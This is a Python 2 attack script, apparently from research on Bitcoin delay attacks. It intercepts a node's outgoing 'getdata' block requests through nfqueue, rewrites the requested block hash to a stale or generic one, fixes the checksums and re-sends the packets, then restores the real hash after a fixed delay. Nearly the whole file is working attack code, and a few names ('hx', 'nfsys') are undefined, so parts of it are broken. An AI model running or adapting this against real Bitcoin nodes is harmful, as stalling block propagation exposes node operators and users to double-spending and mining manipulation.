#!/usr/bin/env python
import sys
import time
import os,sys,nfqueue,socket
from scapy.all import *
import datetime
from time import gmtime, strftime
import argparse
sys.path.insert(0, '/home/user/code/lib/python')
import subprocess
import helpers
import time
import logging
import random
from multiprocessing import Process, Pipe
import re
sys.path.insert(0, '/home/user/scapy-bitcoin/')
import bitcoin
import hexdump as q
import hashlib
sys.path.insert(0, '/home/user/scapy-bitcoin/')
from threading import Thread

OUTDIR='./'
logging.basicConfig(filename=OUTDIR+'debug.log',level=logging.DEBUG)
parser = argparse.ArgumentParser()
parser.add_argument("prop", type=float, help="propability the attacker is on-path")
args = parser.parse_args()
prop=args.prop




conf.verbose = 0
conf.L3socket = L3RawSocket
seqs=set()
threads={}
write_to={}
delay=19
getdata_any=re.compile('676574646174610000000000')
block_getdata = re.compile('676574646174610000000000.*02000000') # precompliled regular expression for block getdata 

class Reader(Thread):
	def __init__(self, read_from,dst):
		super(Reader, self).__init__()
		self.daemon = True
		self.cancelled = False
		self.pipe=read_from
		self.buff=[]
		self.name=dst
		self.modified=False
		self.copy=None
		self.hashes={} #hash--> replaced  with hash 
		self.cur_pkt=None
		self.tup=None
		self.getdata_seq={}
		self.hashes={}
    
	def run(self):
		'''
		one thread is responsible for each bitcoin peer
		reads for assigned pipe and either changes the hash of the requested block to an old one (modify_hash)
		or the hash of the requested transaction back to the requested block
		'''
		while not self.cancelled:
			(frame_data, to_do) = self.pipe.recv()
			now = datetime.datetime.now()
			pkt=IP(frame_data)
			self.tup=(pkt.dst,pkt.id,pkt.len,pkt.seq)
			self.cur_pkt=pkt
			self.modified=False
			seq=pkt.seq    
			#There might be multiple bitcoin message stored in a list of BitcoinHdrs in the packet 
			#or just one message BitcoinHdr  		
			try:
				hdrs=self.cur_pkt[bitcoin.BitcoinHdrs]
				for i in range(len(hdrs.messages)):
					p=hdrs.messages[i]
					try:
						getdata=p[bitcoin.BitcoinGetdata]
						if to_do=='modify_hash':
							self.modify_hash(p)
						elif to_do=='restore_hash' and len(self.buff)>0 and (now-self.buff[0][1]).total_seconds() > delay * 60 :
							self.restore_hash(p, str(self.buff[0][0]) )

					except Exception as e:
						ftuple = [str(now)[11:16]] + map(str, list(self.tup)) + ['is not a getdata', str(e)]
						logging.error('\t'.join(ftuple))
					
					
				self.send()
				
			except Exception as e:
				pass

			try:
				p=self.cur_pkt[bitcoin.BitcoinHdr]
				try:
					getdata=p[bitcoin.BitcoinGetdata]
					if to_do=='modify_hash':
						self.modify_hash(p)
					elif to_do=='restore_hash' and len(self.buff)>0 and (now-self.buff[0][1]).total_seconds() > delay * 60 :
						self.restore_hash(p, str(self.buff[0][0]) )
					
				except Exception as e:
					ftuple = [str(now)[11:16]] + map(str, list(self.tup)) + ['is not a getdata', str(e)]
					logging.error('\t'.join(ftuple))
				self.send()
			except Exception as e:
				ftuple = [str(now)[11:16]] + map(str, list(self.tup)) + ['is a Segment / has no bitcoin Header', str(e)]
				logging.error('\t'.join(ftuple))
				self.send()
			



	
	def checksum(self,bitcoin_inv):
		'''
		we need to recompute the Bitcoin checksum
		otherwise the packet will be ignored by the bitcoin peer
		'''
		now=datetime.datetime.now()
		try:
			p=str(bitcoin_inv).encode("HEX")
			payload=hx.restore(p)
			check=(hashlib.sha256(hashlib.sha256(payload).digest())).hexdigest()
		except Exception as e:
			logging.debug('\t'.join(['ERROR checksum',e]))
			 
		return check[:8]

	def modify_hash(self,bitcoin_hdr):
		now=datetime.datetime.now()
		inv=bitcoin_hdr[bitcoin.BitcoinGetdata]
		#can easily ask for more than 1 block in this case it asks multiple times for the same

		for i in range(len(inv.inventroy)):
			h=str(inv.inventroy[i].hash).encode('HEX')
			try:
				if inv.inventroy[i].type  == 2: # 
					self.modified=True
					
					if h in self.hashes:
						old_hash=self.hashes[h]
						ftuple = [str(now)[11:16]] + map(str, list(self.tup)) + ['change again hash ',h[:5],str(self.modified)]
						fftuple = [str(now)[11:16]] + map(str, list(self.tup)) + ['change again hash ',h[:5],str(self.modified)]
						logging.debug('\t'.join(ftuple))
					
			
					if len(self.buff)>0 and (now-self.buff[0][1]).total_seconds() > delay * 60:
						old_hash= self.buff.pop(0)[0]
						#self.[h]=old_hash
						self.buff.append((h ,now) ) 
						ftuple = [str(now)[11:16]] + map(str, list(self.tup)) + ['change & restore   ',h[:5],old_hash[:5],str(self.modified)]
						fftuple = [str(now)[11:16]] + map(str, list(self.tup)) + ['change & restore   ',h[:5],old_hash[:5],str(self.modified)]
						logging.debug('\t'.join(ftuple))

					else:
						old_hash='74152c6daea4075eff3cf06b59a1850ed3192555b1aa824be597a39a03ec18e5'
						#self.hashes[h]=old_hash
						self.buff.append((h ,now) ) 
						ftuple = [str(now)[11:16]] + map(str, list(self.tup)) + ['change with generic ',h[:5],str(self.modified)]
						fftuple = [str(now)[11:16]] + map(str, list(self.tup)) + ['change with generic ',h[:5],str(self.modified)]
						logging.debug('\t'.join(ftuple))
					inv.inventroy[i].hash=hx.restore(old_hash)
					bitcoin_hdr.checksum = int(self.checksum(inv)[:8],16) 

				elif len(self.buff)>0 and (now-self.buff[0][1]).total_seconds() > delay * 60:
					inv.inventroy[i].type  = 2
					self.modified=True
					old_hash= self.buff.pop(0)[0]
					#self.hashes[h]=old_hash
					inv.inventroy[i].hash=hx.restore(old_hash)
					bitcoin_hdr.checksum = int(self.checksum(inv)[:8],16) 
					
				elif h in self.hashes:
					inv.inventroy[i].type  = 2
					self.modified=True
					#self.hashes[h]=old_hash
					inv.inventroy[i].hash=hx.restore(h)
					bitcoin_hdr.checksum = int(self.checksum(inv)[:8],16) 

					
				ftuple=fftuple+['finished ok']
				logging.debug('\t'.join(ftuple))
			except Exception as e:
				logging.debug('\t'.join(['error in modify_hash',e]))
		return 

	def restore_hash(self,bitcoin_hdr,discarded ):
		now=datetime.datetime.now()
		inv=bitcoin_hdr[bitcoin.BitcoinGetdata]
		if len(inv.inventroy) != inv.count:
			return 
		for i in range(inv.count):
			if inv.inventroy[i].type  == 1:
				ftuple = [str(now)[11:16]] + map(str, list(self.tup)) + [' restore   ',discarded[:5],str(self.modified)]
				try:
					inv.inventroy[i].type  = 2
					self.modified=True
					inv.inventroy[i].hash=hx.restore(discarded)
					bitcoin_hdr.checksum = int(self.checksum(inv)[:8],16) 
					self.buff.pop(0)
					break   
				except Exception as e:
					print 'ERROR restore_hash',e
		return      
	def send(self):
		now=datetime.datetime.now()
		ftuple = [str(now)[11:16]]+map(str, list(self.tup)) + ['should send',str(self.modified)]
		logging.debug('\t'.join(ftuple))
		self.getdata_seq[self.cur_pkt.seq]=( self.getdata_seq[self.cur_pkt.seq][0],(self.cur_pkt[TCP].payload).copy())
		try:
			if self.modified:
				del self.cur_pkt[IP].chksum
				del self.cur_pkt[TCP].chksum 

			send(self.cur_pkt,iface='eth0')
			ftuple =[str(now)[11:16]]+map(str, list(self.tup)) + ['send finished ok',str(self.modified)]
			logging.debug('\t'.join(ftuple))
			return

			

		except Exception as e:
			ftuple = ftuple + map(str, list(self.tup)) + ['send did not finish ok',str(self.modified)]
			logging.debug('\t'.join(ftuple))
		return
def process(i, frame):
	'''
	For each destination there is a pipe
	Process writes to a diffrent pipe per bitcoin peer the operation need to be done and packet
	one thread per bitcoin peer is assigned to read from this pipe
	'''
	global threads
	global write_to
	now = datetime.datetime.now()
	frame_data = frame.get_data()
	size=frame.get_length()
	tmp=str(frame_data).encode('HEX') 
	if  size<55 or size==1500:

		frame.set_verdict(nfqueue.NF_ACCEPT)	
		return
	
	
	is_getdata=getdata_any.search(tmp)

	if is_getdata==None:
		frame.set_verdict(nfqueue.NF_ACCEPT)
		return
    #Only getdata are left
	pkt=IP(frame_data)
	seq=pkt[TCP].seq
	dst= pkt.dst #tmp[32:40]
	tup=(pkt.dst,pkt.id,pkt.len,pkt.seq)    
	if dst not in threads:
		output_p, input_p = Pipe()
		threads[dst]=Reader(output_p,dst)
		write_to[dst]=input_p
		threads[dst].start()

	if seq in threads[dst].getdata_seq : #tcp retransmission. We have this issue because we only delay the packets we change
		if size > threads[dst].getdata_seq[seq][0]:
			ftuple = [str(now)[11:16]] +map(str, list(tup)) + ['got bigger']
			logging.debug('\t'.join(ftuple))
			frame.set_verdict(nfqueue.NF_DROP)

		elif size < threads[dst].getdata_seq[seq][0]:
			ftuple = [str(now)[11:16]] +map(str, list(tup)) + ['got smaller']
			logging.debug('\t'.join(ftuple))
			frame.set_verdict(nfqueue.NF_DROP)

		if threads[dst].getdata_seq[seq][1]==None:
			frame.set_verdict(nfqueue.NF_DROP)
			return
		else:
			pkt[TCP].payload=threads[dst].getdata_seq[seq][1]
			del pkt[IP].chksum
			del pkt[TCP].chksum
			frame.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
			return
	
	threads[dst].getdata_seq[seq]=(size,None)
       


	if block_getdata.search(tmp)!= None  : # if packet contains getdata for block
		coin=random.random() #Decide if attacker controls the connections based on propability 
		if coin <= prop:
			frame.set_verdict(nfqueue.NF_DROP)#drops existing packets
			write_to[dst].send((frame_data,'modify_hash'))#asks responsible thread to modify and send the packet 
			ftuple = [str(now)[11:16]] +map(str, list(tup))+ ['WRITTER:getdata & block WILL MODIFY']
			logging.debug('\t'.join(ftuple))
			return
		else:
			frame.set_verdict(nfqueue.NF_ACCEPT) # Attacker does not see the connection. just sends the packet as is
			ftuple = [str(now)[11:16]] +map(str, list(tup))+ ['WRITTER:getdata & block WILL ACCEPT']
			logging.debug('\t'.join(ftuple))
			return

	elif  len(threads[dst].buff)>0 and (now-threads[dst].buff[0][1]).total_seconds() > delay * 60:
		frame.set_verdict(nfqueue.NF_DROP)
		write_to[dst].send((frame_data,'restore_hash'))#asks responsible thread to restore the old hash and send the packet 
		ftuple = [str(now)[11:16]] +map(str, list(tup))+ ['WRITTER:RESTORE']
		logging.debug('\t'.join(ftuple))
		return

	else:
		frame.set_verdict(nfqueue.NF_ACCEPT)
		ppkt=(pkt[TCP].payload).copy()
		threads[dst].getdata_seq[seq]=(size,ppkt)
		if  len(threads[dst].buff)>0:
			ftuple =  [str(now)[11:16]]+map(str, list(tup))+['WRITTER:was not used to restore',str((now-threads[dst].buff[0][1]).total_seconds()/60.0)]
			logging.debug('\t'.join(ftuple))
			return
	return
	
		


def main( ):
    nfq = nfqueue.queue()
    nfq.open()
    nfq.bind(socket.AF_INET)  
    nfq.set_callback(process)
    nfq.create_queue(0)
    try:
        nfq.try_run() # process is called
        nfq.unbind(socket.AF_INET)
        nfq.close()
        nfsys.exit(1)
    except KeyboardInterrupt:
        nfq.unbind(socket.AF_INET)
        nfq.close()
        nfsys.exit(1)
    return

main()
